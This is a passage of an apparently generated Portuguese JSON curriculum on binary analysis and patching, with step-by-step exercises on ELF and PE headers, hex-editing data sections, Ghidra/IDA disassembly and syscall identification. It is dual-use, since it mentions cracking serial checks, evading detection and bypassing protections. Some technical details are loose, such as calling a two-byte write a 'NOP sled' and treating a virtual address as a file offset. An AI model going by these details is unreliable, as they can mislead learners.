                                "Correlação entre EAT de DLL e IAT do EXE.",
                                "Uso bem-sucedido de PEiD para validar headers.",
                                "Relatório documenta endereços de chamadas dinâmicas."
                              ],
                              "assessmentCriteria": [
                                "Precisão na interpretação de dumps (sem erros de RVA/VA).",
                                "Completude: cobre EAT, IAT e symbols.",
                                "Profundidade: inclui exemplos de resolução de imports.",
                                "Uso correto de ferramentas (dumpbin flags apropriadas).",
                                "Análise crítica: identifica potenciais security implications.",
                                "Clareza no relatório final."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C/C++: Entender DLL loading e dynamic linking.",
                                "Sistemas Operacionais: Processo de carregamento PE pelo Windows loader.",
                                "Segurança da Informação: Detecção de API hooking em malware.",
                                "Análise de Binários: Integração com disassemblers como Ghidra.",
                                "Redes: Análise de network APIs em imports (e.g., Winsock)."
                              ],
                              "realWorldApplication": "Em análise de malware reversa, identificar imports suspeitas (e.g., CreateRemoteThread) ou exports hooked para detecção de rootkits; útil em pentesting para mapear dependências de binários e explorar vulnerabilidades em chamadas dinâmicas."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.6.3",
                    "name": "Modificação e Patching de Binários",
                    "description": "Técnicas para alterar instruções e dados em executáveis compilados.",
                    "individualConcepts": [
                      {
                        "id": "10.1.6.3.1",
                        "name": "Formatos de Arquivos Executáveis (ELF e PE)",
                        "description": "Compreensão da estrutura interna de arquivos executáveis ELF (usado em Linux) e PE (usado em Windows), incluindo cabeçalhos, seções e tabelas de importação/exportação, essencial para localizar pontos de modificação.",
                        "specificSkills": [
                          {
                            "id": "10.1.6.3.1.1",
                            "name": "Analisar estrutura ELF",
                            "description": "Usar ferramentas como readelf e objdump para inspecionar cabeçalhos, seções (.text, .data, .bss) e símbolos em arquivos ELF, identificando offsets para patching.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar ambiente e obter binário ELF de exemplo",
                                  "subSteps": [
                                    "Instalar binutils no Linux/WSL: `sudo apt update && sudo apt install binutils gcc`",
                                    "Criar um programa C simples (ex: hello world) e compilar: `echo 'int main(){return 0;}' > example.c && gcc -o example example.c -no-pie`",
                                    "Verificar formato ELF: `file example` (deve mostrar 'ELF 64-bit')",
                                    "Listar ferramentas disponíveis: `readelf --version` e `objdump --version`"
                                  ],
                                  "verification": "Ferramentas readelf e objdump executam sem erros e o binário é confirmado como ELF.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Linux/WSL com acesso sudo",
                                    "Editor de texto ou terminal"
                                  ],
                                  "tips": "Use -no-pie na compilação para simplificar análise estática; teste em ambiente isolado.",
                                  "learningObjective": "Preparar um ambiente funcional com ferramentas essenciais e um binário ELF pronto para análise.",
                                  "commonMistakes": [
                                    "Esquecer de instalar binutils, resultando em 'command not found'",
                                    "Compilar com PIE ativado, complicando offsets absolutos"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Inspecionar cabeçalho ELF com readelf",
                                  "subSteps": [
                                    "Executar `readelf -h example` para visualizar o cabeçalho ELF",
                                    "Identificar campos principais: Magic Number (7f ELF), e_type (EXEC), e_machine (x86-64), e_entry (endereço de entrada)",
                                    "Anotar offsets chave como e_shoff (offset da tabela de seções) e e_shstrndx (índice da string table)",
                                    "Comparar com documentação ELF para validar estrutura"
                                  ],
                                  "verification": "Pode recitar corretamente e_entry, e_shoff e confirmar Magic Number como 0x7f454c46.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Binário ELF de exemplo",
                                    "Documentação ELF (man readelf ou online)"
                                  ],
                                  "tips": "Use `readelf -h example | grep Entry` para extrair rápido o entry point.",
                                  "learningObjective": "Compreender e extrair metadados fundamentais do cabeçalho ELF.",
                                  "commonMistakes": [
                                    "Confundir little-endian com big-endian em valores hex",
                                    "Ignorar e_phoff para headers de programa"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar seções ELF (.text, .data, .bss)",
                                  "subSteps": [
                                    "Executar `readelf -S example` para listar seções e offsets",
                                    "Identificar seções chave: .text (código executável), .data (dados inicializados), .bss (dados não inicializados)",
                                    "Usar `objdump -h example` para headers de seção com tamanhos e permissões",
                                    "Mapear offsets: ex. endereço virtual e file offset da .text"
                                  ],
                                  "verification": "Lista offsets e tamanhos corretos para .text, .data e .bss.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Binário ELF",
                                    "objdump e readelf"
                                  ],
                                  "tips": "Filtre com `readelf -S example | grep text` para foco rápido.",
                                  "learningObjective": "Mapear layout de seções no arquivo ELF para futuras modificações.",
                                  "commonMistakes": [
                                    "Confundir offset de arquivo com endereço virtual",
                                    "Omitir seções como .rodata"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Examinar símbolos e identificar offsets para patching",
                                  "subSteps": [
                                    "Executar `readelf -s example` ou `objdump -t example` para tabela de símbolos",
                                    "Identificar símbolos como 'main' e seu offset/valor",
                                    "Usar `objdump -d example` para disassembly e localizar offsets em instruções",
                                    "Simular patching: anotar offset da .text para edição hex (ex: com xxd ou hexedit)"
                                  ],
                                  "verification": "Localiza offset exato de 'main' e descreve como patchar uma instrução.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Binário ELF com símbolos (não stripado)",
                                    "Hex editor como xxd"
                                  ],
                                  "tips": "Compile sem -s para preservar símbolos; use `nm example` como alternativa rápida.",
                                  "learningObjective": "Extrair símbolos e offsets precisos para engenharia reversa e patching.",
                                  "commonMistakes": [
                                    "Analisar binário stripped (sem símbolos)",
                                    "Confundir bind local/global em símbolos"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Praticar identificação de offsets para patching real",
                                  "subSteps": [
                                    "Baixar binário real como /bin/ls ou vuln app (ex: de VulnHub)",
                                    "Executar readelf/objdump para mapear .text offset",
                                    "Identificar ponto de entrada ou função vulnerável via disassembly",
                                    "Testar patch simulado: copiar binário, editar offset com `printf '\\x90\\x90' | dd of=patched.bin bs=1 seek=OFFSET conv=notrunc` (NOP sled)"
                                  ],
                                  "verification": "Patch aplicado muda comportamento observável (ex: disassembly mostra NOPs).",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "/bin/ls ou binário vulnerável",
                                    "dd, printf para patching"
                                  ],
                                  "tips": "Backup original antes de patching; valide com `readelf -S patched.bin`.",
                                  "learningObjective": "Aplicar análise para preparar patching em cenários reais.",
                                  "commonMistakes": [
                                    "Offsets errados causam corruption",
                                    "Esquecer alinhamento de seções"
                                  ]
                                }
                              ],
                              "practicalExample": "Analise /bin/ls: use readelf -h para entry point, readelf -S para offset .text (tipicamente ~1K), objdump -t para símbolo 'main', objdump -d para offset de uma instrução jmp; patch NOP no offset para alterar fluxo.",
                              "finalVerifications": [
                                "Lista todas seções principais (.text, .data, .bss) com offsets corretos",
                                "Identifica e explica e_entry e e_shoff do cabeçalho",
                                "Extrai símbolos e seus valores/offsets precisos",
                                "Valida mudanças pós-patching com readelf/objdump",
                                "Desmonta corretamente seção .text com offsets alinhados"
                              ],
                              "assessmentCriteria": [
                                "Precisão nos offsets reportados (erro <1 byte)",
                                "Explicação clara de cada campo ELF consultado",
                                "Uso correto de flags em readelf/objdump (sem erros de sintaxe)",
                                "Identificação de pelo menos 3 símbolos e suas seções",
                                "Simulação de patch bem-sucedida sem corromper binário"
                              ],
                              "crossCurricularConnections": [
                                "Programação em Assembly: leitura de disassembly para offsets de instruções",
                                "Sistemas Operacionais: loaders ELF e mmap de seções",
                                "Segurança Computacional: patching exploits em binários malware",
                                "Compiladores: impacto de flags gcc em layout ELF",
                                "Redes: análise de binários em forensics de ataques"
                              ],
                              "realWorldApplication": "Em análise de malware, engenheiros reversos usam isso para patchar vulnerabilidades em binários legados sem source code, como corrigir buffer overflows em firmwares IoT ou desabilitar backdoors em executáveis infectados."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.6.3.1.2",
                            "name": "Analisar estrutura PE",
                            "description": "Empregar ferramentas como CFF Explorer ou pefile (Python) para examinar DOS header, NT headers, seções e imports em arquivos PE, mapeando áreas editáveis.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar ambiente e obter amostra PE",
                                  "subSteps": [
                                    "Instalar CFF Explorer baixando do site oficial ou repositório confiável.",
                                    "Instalar Python e a biblioteca pefile via pip: pip install pefile.",
                                    "Baixar uma amostra PE simples, como notepad.exe do Windows System32.",
                                    "Verificar integridade do arquivo com hash SHA256 para garantir autenticidade.",
                                    "Criar um diretório de trabalho dedicado para análise."
                                  ],
                                  "verification": "Ferramentas instaladas e funcionando; amostra PE aberta sem erros em CFF Explorer.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "CFF Explorer",
                                    "Python 3.x",
                                    "pefile library",
                                    "Amostra PE (ex: notepad.exe)"
                                  ],
                                  "tips": "Use uma VM isolada para análise de binários para evitar riscos de segurança.",
                                  "learningObjective": "Preparar um ambiente seguro e ferramentas essenciais para análise PE.",
                                  "commonMistakes": [
                                    "Instalar ferramentas de fontes não confiáveis",
                                    "Analisar binários maliciosos sem isolamento",
                                    "Esquecer de verificar integridade da amostra"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Examinar DOS Header com CFF Explorer e pefile",
                                  "subSteps": [
                                    "Abrir o arquivo PE no CFF Explorer e navegar para a aba DOS Header.",
                                    "Identificar campos chave: e_magic (MZ), e_lfanew (ponteiro para NT Headers).",
                                    "Usar pefile em Python: carregar arquivo e acessar pe.DOS_HEADER para printar campos.",
                                    "Comparar valores entre CFF Explorer e script Python para validação.",
                                    "Anotar offsets e tamanhos do DOS Header."
                                  ],
                                  "verification": "Listar corretamente e_magic=0x4D5A e e_lfanew apontando para NT Headers.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "CFF Explorer",
                                    "Python com pefile",
                                    "Script Python básico"
                                  ],
                                  "tips": "Anote offsets em hexadecimal para precisão.",
                                  "learningObjective": "Entender e extrair dados do DOS Header usando ferramentas visuais e programáticas.",
                                  "commonMistakes": [
                                    "Confundir little-endian com big-endian",
                                    "Ignorar o stub DOS",
                                    "Não validar ponteiro e_lfanew"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar NT Headers, Optional Header e Seções",
                                  "subSteps": [
                                    "No CFF Explorer, ir para NT Headers: Signature (PE00), File Header (Machine, NumberOfSections).",
                                    "Examinar Optional Header: Magic, SizeOfCode, AddressOfEntryPoint, DataDirectory.",
                                    "Listar seções via Section Headers: nomes (.text, .data), VirtualSize, RawSize, Characteristics.",
                                    "Com pefile: acessar pe.NT_HEADERS, pe.OPTIONAL_HEADER, pe.sections para dump.",
                                    "Mapear alinhamentos RVA vs. File Offset."
                                  ],
                                  "verification": "Identificar corretamente NumberOfSections, EntryPoint RVA e pelo menos 5 seções principais.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "CFF Explorer",
                                    "Python com pefile"
                                  ],
                                  "tips": "Foquem em Characteristics como EXECUTE_READ para identificar seções editáveis.",
                                  "learningObjective": "Mapear estrutura principal do PE, incluindo headers e layout de seções.",
                                  "commonMistakes": [
                                    "Confundir RVA com offsets de arquivo",
                                    "Ignorar DataDirectory para imports",
                                    "Não checar alinhamentos de seção"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar Imports, Exports e mapear áreas editáveis",
                                  "subSteps": [
                                    "No CFF Explorer, navegar para Import Directory: listar DLLs e funções importadas.",
                                    "Verificar Export Directory para funções exportadas.",
                                    "Com pefile: iterar pe.DIRECTORY_ENTRY_IMPORT e pe.DIRECTORY_ENTRY_EXPORT.",
                                    "Identificar áreas editáveis: seções com WRITE permission, IAT (Import Address Table).",
                                    "Criar diagrama manual mapeando headers, seções e imports."
                                  ],
                                  "verification": "Listar top 5 imports/exports e destacar 3 áreas editáveis com offsets.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "CFF Explorer",
                                    "Python com pefile",
                                    "Ferramenta de diagrama como draw.io"
                                  ],
                                  "tips": "Procure por delays imports ou bound imports para complexidade avançada.",
                                  "learningObjective": "Identificar dependências e pontos de modificação em binários PE.",
                                  "commonMistakes": [
                                    "Não diferenciar IAT de Import Directory",
                                    "Ignorar relocações",
                                    "Mapear incorretamente permissões de seção"
                                  ]
                                }
                              ],
                              "practicalExample": "Analise notepad.exe: Verifique DOS Header (e_lfanew ~0xF8), NT Headers (máquina i386), seções (.text ~0x1A000 bytes), imports (kernel32.dll: LoadLibraryA). Mapeie .rdata como editável para patching strings.",
                              "finalVerifications": [
                                "DOS Header corretamente parseado com e_lfanew válido.",
                                "NT Headers e Optional Header com valores consistentes.",
                                "Todas seções listadas com tamanhos e permissões corretas.",
                                "Imports e exports extraídos e validados via ambas ferramentas.",
                                "Mapa de áreas editáveis criado e justificado.",
                                "Script Python reproduz análise do CFF Explorer."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de todos headers principais (90%+ acurácia).",
                                "Uso correto de ambas ferramentas com outputs comparáveis.",
                                "Mapeamento completo de seções e diretórios (mínimo 80% cobertura).",
                                "Identificação lógica de áreas editáveis baseada em characteristics.",
                                "Diagrama claro e offsets precisos em hex.",
                                "Análise de imports/export com pelo menos 10 entradas listadas."
                              ],
                              "crossCurricularConnections": [
                                "Programação Python: Uso de bibliotecas como pefile para automação.",
                                "Análise de Malware: Identificação de packing/obfuscation em PE maliciosos.",
                                "Sistemas Operacionais: Entender carregamento de executáveis Windows.",
                                "Criptografia: Verificação de assinaturas PE e checksums."
                              ],
                              "realWorldApplication": "Em análise de malware, engenharia reversa para patching de cracks, desenvolvimento de loaders personalizados ou detecção de binários modificados em forense digital."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.6.3.1.3",
                            "name": "Modificar seções de dados",
                            "description": "Alterar valores em seções .data ou .rdata usando editores hexadecimais como HxD, garantindo alinhamento e recalculando checksums se necessário.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar o ambiente e analisar o binário inicial",
                                  "subSteps": [
                                    "Instale um editor hexadecimal como HxD ou x64dbg com suporte a hex editing.",
                                    "Baixe um binário de exemplo (ex: um executável PE simples com seções .data ou .rdata identificáveis).",
                                    "Use ferramentas como PEiD, CFF Explorer ou readelf (para ELF) para mapear as seções do binário e identificar offsets de .data/.rdata.",
                                    "Faça backup do arquivo original.",
                                    "Anote o tamanho atual das seções e qualquer checksum presente (ex: via strings ou hexdump)."
                                  ],
                                  "verification": "Confirme que o binário abre corretamente no editor hex e que as seções estão visíveis com offsets corretos.",
                                  "estimatedTime": "15-20 minutos",
                                  "materials": [
                                    "Editor hex (HxD), Ferramentas de análise PE/ELF (CFF Explorer, objdump), Binário de teste"
                                  ],
                                  "tips": "Sempre trabalhe em cópias; use um VM para isolar testes.",
                                  "learningObjective": "Entender a estrutura de seções em binários PE/ELF e preparar ambiente seguro.",
                                  "commonMistakes": "Editar o binário original sem backup; ignorar arquitetura (32/64-bit)."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Localizar a seção .data ou .rdata no editor hexadecimal",
                                  "subSteps": [
                                    "Abra o binário no HxD e navegue para o offset da seção via 'Search > Go to Offset'.",
                                    "Identifique marcadores da seção (ex: headers PE mostram VirtualAddress e Size).",
                                    "Examine o conteúdo: procure strings ou valores conhecidos na .rdata (read-only data).",
                                    "Marque o início e fim da seção para edição.",
                                    "Salve uma snapshot antes de prosseguir."
                                  ],
                                  "verification": "Visualize corretamente o conteúdo da seção e confirme com ferramentas externas (ex: strings comando).",
                                  "estimatedTime": "10-15 minutos",
                                  "materials": [
                                    "HxD ou similar, Referência de headers PE/ELF"
                                  ],
                                  "tips": "Use 'View > Sections' se disponível; ative highlight para bytes nulos.",
                                  "learningObjective": "Navegar e interpretar seções de dados em view hexadecimal.",
                                  "commonMistakes": "Confundir offsets RVA com file offsets; editar seções erradas como .text."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Realizar a modificação nos valores da seção",
                                  "subSteps": [
                                    "Decida a alteração (ex: mudar uma string de 'Hello' para 'Modified').",
                                    "Calcule o novo tamanho se necessário (mantenha alinhamento de 4/8 bytes).",
                                    "Edite os bytes diretamente no hex view, preservando padding.",
                                    "Preencha com NOPs (90h) ou zeros se encurtar/encompridar.",
                                    "Atualize o tamanho da seção no header PE/ELF se alterado."
                                  ],
                                  "verification": "Compare before/after no editor; use diff tools como Beyond Compare para hex.",
                                  "estimatedTime": "20-30 minutos",
                                  "materials": [
                                    "HxD, Calculadora hex para alinhamento"
                                  ],
                                  "tips": "Mantenha alinhamento: divida endereço por 0x1000 para page alignment.",
                                  "learningObjective": "Editar dados com precisão, mantendo integridade estrutural.",
                                  "commonMistakes": "Quebrar alinhamento causando crashes; overflow sem atualizar headers."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Recalcular checksums e validar alinhamento",
                                  "subSteps": [
                                    "Identifique se o binário tem checksum (ex: PE optional header).",
                                    "Use ferramentas como PEChecksumFixer ou script Python para recalcular Image checksum.",
                                    "Verifique alinhamento de seções (FileAlignment/VirtualAlignment).",
                                    "Corrija headers se necessário (ex: SizeOfRawData).",
                                    "Salve o arquivo modificado."
                                  ],
                                  "verification": "Checksum matches via explorer properties ou tool; binário carrega sem erros.",
                                  "estimatedTime": "15-25 minutos",
                                  "materials": [
                                    "PE tools (CFF Explorer), Scripts para checksum"
                                  ],
                                  "tips": "Para ELF, foque em dynamic section; teste com loader.",
                                  "learningObjective": "Manter validade do binário pós-modificação.",
                                  "commonMistakes": "Esquecer checksum levando a rejeição pelo OS; desalinhamento."
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Testar e verificar o binário modificado",
                                  "subSteps": [
                                    "Execute o binário em ambiente controlado (VM/debugger).",
                                    "Use debugger (x64dbg/OllyDbg) para checar se dados alterados são lidos corretamente.",
                                    "Monitore crashes ou AV detections.",
                                    "Compare comportamento original vs modificado.",
                                    "Documente mudanças."
                                  ],
                                  "verification": "Binário roda, alteração reflete (ex: nova string exibida), sem crashes.",
                                  "estimatedTime": "20-30 minutos",
                                  "materials": [
                                    "VM, Debugger (x64dbg), Original binário"
                                  ],
                                  "tips": "Strace ou ProcMon para monitorar loads.",
                                  "learningObjective": "Validar modificações em runtime.",
                                  "commonMistakes": "Testar em host principal; ignorar ASLR/DEP."
                                }
                              ],
                              "practicalExample": "Em um executável PE 'calc.exe' modificado, altere a string 'Calculator' em .rdata (offset 0x401000) para 'HackedCalc', ajuste tamanho para 10 bytes alinhado, recalcule checksum PE e execute para ver nova janela title.",
                              "finalVerifications": [
                                "Binário carrega sem erros de checksum ou loader.",
                                "Conteúdo modificado é acessado corretamente em runtime.",
                                "Alinhamento de seções preservado (ver headers).",
                                "Tamanho de arquivo e seções atualizados.",
                                "Nenhuma detecção anormal por AV/debugger.",
                                "Strings/dados refletem mudanças via strings/dumpbin.",
                                "Executa funcionalmente como original exceto alteração."
                              ],
                              "assessmentCriteria": [
                                "Precisão na localização e edição (sem bytes extras alterados).",
                                "Manutenção correta de alinhamento e headers.",
                                "Recálculo preciso de checksum validado.",
                                "Testes de runtime demonstram sucesso.",
                                "Documentação clara de steps e verificações.",
                                "Eficiência temporal dentro de estimados.",
                                "Tratamento de erros comuns evitado."
                              ],
                              "crossCurricularConnections": [
                                "Programação em Assembly: Entender referências a dados.",
                                "Análise de Malware: Patching para análise.",
                                "Criptografia: Modificar chaves em .data.",
                                "Sistemas Operacionais: Loaders e seções de memória.",
                                "Redes: Alterar beacons em binários maliciosos."
                              ],
                              "realWorldApplication": "Em engenharia reversa de malware, modificar strings em .rdata para evasão de detecção ou análise comportamental; patching de vulnerabilidades em firmwares proprietários; customização de binários em CTFs e pentests para bypass de proteções."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.6.3.2",
                        "name": "Disassembly e Análise de Instruções Assembly",
                        "description": "Desmontagem de código binário em assembly x86/x64 para identificar fluxos de controle, chamadas de função e pontos de injeção, preparando para modificações precisas.",
                        "specificSkills": [
                          {
                            "id": "10.1.6.3.2.1",
                            "name": "Desmontar binários com IDA Pro ou Ghidra",
                            "description": "Carregar executáveis e navegar pelo grafo de controle, analisando instruções como JMP, CALL e MOV em assembly 32/64 bits.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Instalação e Configuração Inicial de IDA Pro ou Ghidra",
                                  "subSteps": [
                                    "Baixe a versão gratuita do Ghidra do site oficial do NSA ou instale o IDA Freeware.",
                                    "Extraia/instale o software em um ambiente virtualizado (ex: VM Windows/Linux para evitar riscos).",
                                    "Configure o workspace: crie um novo projeto no Ghidra ou abra o IDA.",
                                    "Instale plugins essenciais como para análise de PE/ELF e deobfuscation básica.",
                                    "Teste a abertura de um executável simples (hello world) para validar a instalação."
                                  ],
                                  "verification": "Abra um binário de teste e confirme que o disassembly aparece sem erros.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Ghidra ou IDA Free download",
                                    "Máquina virtual (VirtualBox/VMware)",
                                    "Binário de teste compilado localmente"
                                  ],
                                  "tips": "Use Ghidra para iniciantes por ser gratuito e open-source; prefira Linux para melhor suporte a ELF.",
                                  "learningObjective": "Configurar ambiente de disassembly de forma segura e funcional.",
                                  "commonMistakes": [
                                    "Executar em máquina host sem VM (risco de malware)",
                                    "Ignorar detecção de arquitetura (32 vs 64 bits)",
                                    "Não criar projeto novo (perda de análise)"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Carregamento e Desmontagem Inicial do Executável",
                                  "subSteps": [
                                    "Selecione e carregue um executável PE (Windows) ou ELF (Linux) via File > Open.",
                                    "Auto-analise o binário: defina base address, detecte funções e strings automaticamente.",
                                    "Navegue para a seção de entry point (ex: main) e visualize o pseudocódigo (decompiler no Ghidra).",
                                    "Ajuste tipos de dados: aplique estruturas conhecidas como WinAPI.",
                                    "Salve o banco de dados da análise para reutilização."
                                  ],
                                  "verification": "Visualize o grafo de funções e confirme funções principais desmontadas corretamente.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Executável de teste (crackme ou sample.exe)",
                                    "Documentação de formatos PE/ELF"
                                  ],
                                  "tips": "Sempre analise em modo read-only primeiro; use 'Analyze' no Ghidra para precisão.",
                                  "learningObjective": "Carregar binários e gerar disassembly inicial automatizado.",
                                  "commonMistakes": [
                                    "Carregar binário packed sem unpack (análise falha)",
                                    "Ignorar endianness em cross-platform",
                                    "Não definir corretamente a arquitetura (x86 vs x64)"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Navegação pelo Grafo de Controle",
                                  "subSteps": [
                                    "Abra o Graph View: clique duplo em funções para ver CFG (Control Flow Graph).",
                                    "Identifique blocos básicos: loops, condicionais e caminhos de execução.",
                                    "Use cross-references (Xrefs): encontre chamadores de funções críticas.",
                                    "Renomeie funções e variáveis para clareza (ex: sub_401000 -> check_serial).",
                                    "Trace caminhos: simule execução manual destacando blocos."
                                  ],
                                  "verification": "Descreva o fluxo de uma função principal em 3-5 blocos conectados.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Binário com grafo complexo (ex: com autenticação)",
                                    "Teoria de CFG básica"
                                  ],
                                  "tips": "Zoom e pan no grafo para grandes funções; use atalhos como 'G' para ir para endereço.",
                                  "learningObjective": "Interpretar visualmente o fluxo de controle em assembly.",
                                  "commonMistakes": [
                                    "Confundir JMP incondicional com condicional",
                                    "Perder loops infinitos em análise estática",
                                    "Não usar Xrefs para contexto global"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Análise Detalhada de Instruções Assembly (JMP, CALL, MOV)",
                                  "subSteps": [
                                    "Localize instruções: busque por JMP/CALL/MOV via search ou grafo.",
                                    "Analise JMP: identifique condicionais (JE/JNE) e alvos (forward/backward).",
                                    "Examine CALL: trace parâmetros, retornos e APIs externas.",
                                    "Decifre MOV: entenda registradores, memória e operações (ex: MOV EAX, [EBP+8] para args).",
                                    "Anote comentários: explique impacto no fluxo (ex: bypass de check)."
                                  ],
                                  "verification": "Explique 3 instruções chave e seu papel no programa.",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "Referência assembly x86/x64 (Intel manual PDF)",
                                    "Binário com instruções destacadas"
                                  ],
                                  "tips": "Use listing view para linear e grafo para visual; aprenda opcodes hex para busca rápida.",
                                  "learningObjective": "Dissecar instruções comuns em contexto de fluxo.",
                                  "commonMistakes": [
                                    "Interpretar MOV como atribuição simples (ignore flags)",
                                    "Confundir CALL com JMP (pilha vs direto)",
                                    "Não considerar registradores de 32/64 bits"
                                  ]
                                }
                              ],
                              "practicalExample": "Carregue 'crackme.exe' (32-bit PE). Navegue ao entry point, identifique JMP EAX no check de serial (offset 0x4012A0), trace CALL strcmp, e analise MOV ECX, input para comparação. Explique como patchar o JMP para NOP.",
                              "finalVerifications": [
                                "Carrega e analisa um binário desconhecido sem crashes.",
                                "Gera e interpreta CFG com loops e branches corretos.",
                                "Identifica e explica pelo menos 5 JMP/CALL/MOV em contexto.",
                                "Usa Xrefs para mapear chamadas globais.",
                                "Salva análise anotada e reproduz em nova sessão.",
                                "Diferencia assembly 32 vs 64 bits (registradores/sintaxe)."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de blocos de controle (90%+ correto).",
                                "Explicação clara de instruções com impacto no fluxo.",
                                "Uso efetivo de ferramentas (grafo, Xrefs, decompiler).",
                                "Análise de edge cases (anti-debug, obfuscation leve).",
                                "Documentação comentada e organizada.",
                                "Tempo de análise eficiente (<2h para binário médio)."
                              ],
                              "crossCurricularConnections": [
                                "Arquitetura de Computadores: Registradores e pipeline x86/x64.",
                                "Programação em C/Assembly: Tradução high-level para low-level.",
                                "Análise de Malware: Identificação de payloads via disassembly.",
                                "Debugging Dinâmico: Integração com GDB/WinDbg.",
                                "Criptografia: Análise de chaves em MOV/CALL."
                              ],
                              "realWorldApplication": "Na análise de malware, engenheiros reversos desmontam binários para detectar exploits (ex: ransomware), patcham vulnerabilidades em software legado, ou validam patches de segurança em firmwares IoT."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.6.3.2.2",
                            "name": "Identificar chamadas de sistema e funções",
                            "description": "Localizar syscalls (int 0x80 ou syscall) e imports de APIs (ex: WriteFile em PE), entendendo parâmetros e retornos para patching.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Conceitos Básicos de Syscalls e Imports de APIs",
                                  "subSteps": [
                                    "Estude syscalls em Linux: int 0x80 (legacy) e syscall (moderna), incluindo tabelas de números de chamada (ex: /usr/include/asm/unistd_64.h).",
                                    "Aprenda sobre imports em executáveis PE (Windows): seções .idata e .IAT, com exemplos como WriteFile (kernel32.dll).",
                                    "Revise convenções de chamadas: registradores em x86/x64 (eax/rax para syscall number, rcx/rdx para params).",
                                    "Identifique retornos: eax/rax geralmente contém status ou handles.",
                                    "Compare syscalls Linux vs. APIs Windows para patching cross-platform."
                                  ],
                                  "verification": "Explique em suas palavras a diferença entre int 0x80 e syscall, e liste 3 params de WriteFile.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Documentação Linux man pages, MSDN para WinAPI, tabela de syscalls (syscalltable.net).",
                                  "tips": "Use um cheat sheet de syscalls para referência rápida durante a análise.",
                                  "learningObjective": "Dominar terminologia e padrões de chamadas de sistema e APIs para reconhecimento em binários.",
                                  "commonMistakes": "Confundir syscalls com funções user-space; ignorar arquitetura (x86 vs x64)."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Disassemble Binários ELF e Localize Syscalls",
                                  "subSteps": [
                                    "Baixe um binário ELF simples (ex: 'echo hello' compilado com gcc -static).",
                                    "Use objdump -d ou Ghidra para disassemble e procure por 'int 0x80' ou 'syscall'.",
                                    "Identifique o número da syscall em eax/rax (ex: 1 para write).",
                                    "Trace o fluxo: params empilhados ou em registradores antes da chamada.",
                                    "Anote o retorno e jumps condicionais pós-chamada."
                                  ],
                                  "verification": "Apresente snippet de disassembly com syscall destacada e explique params/retorno.",
                                  "estimatedTime": "60 minutos",
                                  "materials": "Ghidra ou IDA Free, objdump (binutils), binário ELF de teste (ex: de challs CTF).",
                                  "tips": "Filtre disassembly por strings como 'syscall' ou 'int 80h' no search.",
                                  "learningObjective": "Localizar e interpretar syscalls em binários Linux de forma autônoma.",
                                  "commonMistakes": "Não considerar relocação dinâmica; confundir syscall com int 21h (DOS)."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analise Imports e Chamadas de API em Arquivos PE",
                                  "subSteps": [
                                    "Abra um PE simples (ex: notepad.exe ou binário custom com WriteFile).",
                                    "Use PEiD, CFF Explorer ou Ghidra para inspecionar seções .idata/.IAT e lista de imports.",
                                    "Disassemble o código caller: procure call [import_addr] para WriteFile.",
                                    "Mapeie params: hFile, lpBuffer, nNumberOfBytesToWrite, etc., via convenção stdcall/fastcall.",
                                    "Verifique thunk e resolução lazy/eager de imports."
                                  ],
                                  "verification": "Liste imports relevantes e mostre disassembly de uma chamada WriteFile com params anotados.",
                                  "estimatedTime": "75 minutos",
